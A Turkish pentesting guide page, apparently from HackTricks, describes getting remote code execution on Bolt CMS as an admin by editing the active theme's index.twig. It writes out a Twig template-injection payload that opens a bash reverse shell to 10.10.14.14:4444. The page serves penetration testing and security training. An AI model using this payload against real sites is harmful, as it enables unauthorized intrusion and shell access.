# Bolt CMS

{{#include ../../banners/hacktricks-training.md}}

## RCE

Admin olarak giriş yaptıktan sonra (giriş istemine erişmek için /bot adresine gidin), Bolt CMS'de RCE alabilirsiniz:

- `Configuration` -> `View Configuration` -> `Main Configuration` seçeneğini seçin veya URL yoluna `/bolt/file-edit/config?file=/bolt/config.yaml` gidin
- Tema değerini kontrol edin

<figure><img src="../../images/image (771).png" alt=""><figcaption></figcaption></figure>

- `File management` -> `View & edit templates` seçeneğini seçin
- Önceki adımda bulunan tema tabanını seçin (`base-2021` bu durumda) ve `index.twig` seçeneğini seçin
- Benim durumumda bu URL yolunda /bolt/file-edit/themes?file=/base-2021/index.twig
- Bu dosyada [template injection (Twig)](../../pentesting-web/ssti-server-side-template-injection/#twig-php) ile yüklemenizi ayarlayın, örneğin: `{{['bash -c "bash -i >& /dev/tcp/10.10.14.14/4444 0>&1"']|filter('system')}}`
- Ve değişiklikleri kaydedin

<figure><img src="../../images/image (948).png" alt=""><figcaption></figcaption></figure>

- `Maintenance` -> `Clear the cache` seçeneği ile önbelleği temizleyin
- Sayfaya tekrar normal bir kullanıcı olarak erişin ve yükleme çalıştırılmalıdır

{{#include ../../banners/hacktricks-training.md}}
